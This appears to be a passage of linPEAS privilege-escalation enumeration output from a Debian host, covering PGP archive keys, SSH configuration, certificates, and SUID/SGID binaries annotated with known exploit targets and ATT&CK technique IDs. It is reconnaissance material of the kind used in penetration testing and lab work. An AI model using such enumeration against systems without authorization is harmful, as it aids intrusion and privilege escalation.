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
ugNdPbTx5TQVD48tsKiSIOPP1g==
=UqDn
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 1384 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-trixie-stable.asc
-----BEGIN PGP PUBLIC KEY BLOCK-----
mDMEZ+Gq1RYJKwYBBAHaRw8BAQdARlh1OX84KPJRedAP/M7WxPFEthWypAp8nved
FhqaX0q0R0RlYmlhbiBTdGFibGUgUmVsZWFzZSBLZXkgKDEzL3RyaXhpZSkgPGRl
Ymlhbi1yZWxlYXNlQGxpc3RzLmRlYmlhbi5vcmc+iJYEExYIAD4WIQRBWH99uMd0
vM8TFBZ2L2egssOd5AUCZ+Gq1QIbAwUJDwmcAAULCQgHAgYVCgkICwIEFgIDAQIe
AQIXgAAKCRB2L2egssOd5DjVAP49S/e9VAtn9ip2DXj5zx87MpUXnLHAhT/LsJ7J
odnKoQEA8murEqdcC0pPsAA6Gmev/lz0MWUyfe5Y6DMB6t16FQuIdQQTFgoAHRYh
BMphnWWnKnut/JbSgBlkGKrrdMihBQJn4atmAAoJEBlkGKrrdMihxnAA/3i7WOUU
Dyea6tABVGfFKfHj6yAbfcKVr5GL0WSOQiXNAQC2YTKoTfCY/WOZnCwEHebpM3Mr
6+A8lenj8pFzm8mFAokCMgQQAQoAHRYhBHIDYw4sjnJyUWhP68XOXcLFQs1ZBQJn
4v59AAoJEMXOXcLFQs1ZfdkP90fbXOydWNb1iXwu/vaUjxSx5Nk0Zwkjj7Pi74PZ
Ifd9c0Luf/j7dEHuJOzkOKvkrpTYeQN8Ms9ITVTMeNSOoQn8tnYsxhHqHUcI9ym/
vJ6liIsE2K95gwH2mOQ24ot59pMyQX7sXE4DuQqlrEW1JRemKs7WJB2E/4I7smqG
3+/mqXAoHKkpFBMm1v9tNVx1Tp3ER6C4VFszONlmX0NLB5If+wSits1LnsVgBK1D
Hd3Nxh78YQL0W2xBCOfsHryaKkLW6tp1efTpMHfe4lDEgTFvEWaO3NlPEeD67uxA
KpEG1b/CzBqx+Og1RT+0iZkW9oXYoKJI0Vx0HlYeMrhuE+Q0Fqy/nZYcWhq3y6Tu
GC9J+hyB7D3Z7ne48zNGaAU4x7+6pvkmlBWnNwPH/IlGbexa/F8o+rU0AWrvYCVR
cbbcSsgkq1Dl/Xjbvlx9gwkKnhacbQ5VUOA2Zkp6oBn/pFD1W8xE0X4dNHcM3J5k
CAeZuszjPIZXvwuvAjaOE7ZxKvGDlQTWK8zR5h9tvcwMfVND+EqK0qfDGDMtJqu/
W0lSJj3G/FMO3aGn0Ks6b7cmjbCGjmn7WBGJT2PvH4A4ml1qopWy7Ont6zt1+Cll
y/0Uf75AamJSrAAYFFIJlcpWH/7NRW2L+n1FoIOv5xj5h675uHh/WFlPTNQqrRaP
p1o=
=k1cs
-----END PGP PUBLIC KEY BLOCK-----

╔══════════╣ Searching uncommon passwd files (splunk) (T1552.001)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files (T1552.004,T1021.004)
╔══════════╣ Analyzing SSH Files (limit 70)

-rw-r--r-- 1 root root 173 Nov  2  2025 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Nov  2  2025 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 565 Nov  2  2025 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin prohibit-password
PubkeyAuthentication yes
AuthorizedKeysFile      .ssh/authorized_keys
UsePAM yes
══╣ Some certificates were found (out limited): (T1552.004,T1021.004)
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt

══╣ Some home ssh config file was found (T1552.004,T1021.004)
/usr/share/openssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules: (T1552.004,T1021.004)
/etc/hosts.allow

Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 639K Jul 28  2025 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 15K Jan  8 09:28 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14K Jan  8 09:28 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus 51K Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 62K Dec 14 09:00 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 67K Dec 14 09:00 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 48K Dec 14 09:00 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Nov 21  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 276K Dec 30 15:07 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 71K Nov 21  2024 /usr/bin/su
-rwsr-xr-x 1 root root 52K Dec 14 09:00 /usr/bin/chsh
-rwsr-xr-x 1 root root 35K Nov 21  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Dec 14 09:00 /usr/bin/gpasswd

╔══════════╣ SGID (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root shadow 39K Aug 10  2025 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root crontab 43K Mar  2  2023 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 31K Dec 14 09:00 /usr/bin/expiry
-rwxr-sr-x 1 root mail 23K Feb  4  2021 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 79K Dec 14 09:00 /usr/bin/chage
-rwxr-sr-x 1 root _ssh 475K Jul 28  2025 /usr/bin/ssh-agent

╔══════════╣ Files with ACLs (limited to 50) (T1222)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls
files with acls in searched folders Not Found

╔══════════╣ Capabilities (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
══╣ Current shell capabilities (T1548.001)
./linpeas.sh: 9637: [[: not found
CapInh:  [Invalid capability format]
./linpeas.sh: 9637: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 9628: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 9637: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 9637: [[: not found
CapAmb:  [Invalid capability format]

╚ Parent process capabilities
./linpeas.sh: 9662: [[: not found
CapInh:  [Invalid capability format]
./linpeas.sh: 9662: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 9653: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 9662: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 9662: [[: not found
CapAmb:  [Invalid capability format]

══╣ Processes with capability sets (non-zero CapEff/CapAmb, limit 40) (T1548.001)
PID 1 (systemd) user=root
  CapInh: 0x0000000000000000=
